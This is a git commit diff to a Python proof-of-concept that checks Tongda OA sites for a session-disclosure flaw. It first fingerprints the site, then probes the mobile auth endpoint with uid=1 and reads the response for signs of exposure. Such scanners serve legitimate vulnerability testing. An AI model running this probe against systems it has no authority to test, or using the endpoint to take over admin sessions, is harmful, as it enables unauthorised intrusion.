7ed14d60725c2d155a4e99dc8328ed22ddb7fbe0
hbdhack3r <51362701+SCAMagic@users.noreply.github.com>
2022-11-25 14:49:08 +0800

    Update poc-yaml-tongda-user-session-disclosure.py

--- pocs/poc-yaml-tongda-user-session-disclosure.py
+++ pocs/poc-yaml-tongda-user-session-disclosure.py
@@ -6,15 +6,19 @@ def scan(baseurl):
 		baseurl=baseurl
 	else:
 		baseurl=baseurl+"/"
-	url = baseurl + "mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0"
-	headers = {
-			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
-		}
-	response = requests.get(url=url,headers=headers,verify=False,timeout=5)  #verify=False为忽略CA证书
-	if "RELOGIN" in response.text and response.status_code == 200:  #如果页面显示RELOGIN且网站状态码为200
-		return True
-	elif response.text == "" and response.status_code == 200:  #如果页面空白且状态码为200
-		return True
+	url = baseurl
+	response = requests.get(url=url,verify=False,timeout=5)
+	if 'tongda' in response.text:
+		url = baseurl + "mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0"
+		headers = {
+				"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
+			}
+		response = requests.get(url=url,headers=headers,verify=False,timeout=5)  #verify=False为忽略CA证书
+		if "RELOGIN" in response.text and response.status_code == 200:  #如果页面显示RELOGIN且网站状态码为200
+			return True
+		elif response.text == "" and response.status_code == 200:  #如果页面空白且状态码为200
+			return True
+		else:
+			return False
 	else:
 		return False
-
